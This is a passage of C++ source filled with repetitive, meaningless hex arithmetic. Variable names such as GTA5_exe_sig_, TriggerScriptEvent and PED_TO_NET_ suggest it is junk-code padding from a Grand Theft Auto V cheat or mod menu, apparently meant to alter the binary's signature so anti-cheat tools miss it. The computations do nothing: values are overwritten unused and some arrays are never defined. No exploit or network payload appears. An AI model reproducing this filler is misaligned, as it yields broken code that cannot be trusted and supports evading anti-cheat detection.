				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<ClearDatabase>false</ClearDatabase>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
